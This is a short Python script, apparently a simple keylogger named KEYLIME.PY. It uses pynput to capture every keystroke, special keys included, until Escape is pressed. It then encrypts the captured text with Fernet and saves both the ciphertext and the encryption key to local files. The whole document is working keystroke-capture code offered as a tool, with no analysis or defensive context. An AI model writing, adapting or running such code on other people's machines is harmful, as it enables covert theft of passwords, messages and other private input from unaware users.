KEYLIME.PY

from pynput import keyboard
from cryptography.fernet import Fernet

encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)
text_buffer = ""


def on_press(key):
    global text_buffer

    try:
        char = key.char
        if char is not None:
            text_buffer += char
    except AttributeError:
        special_key = f"[{key}]"
        text_buffer += special_key


def on_release(key):
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

encrypted_data = cipher_suite.encrypt(bytes(text_buffer, 'utf-8'))

with open('encrypted_keystrokes', 'wb') as f:
    f.write(encrypted_data)

with open('encryption_key.txt', 'wb') as f:
    f.write(encryption_key)

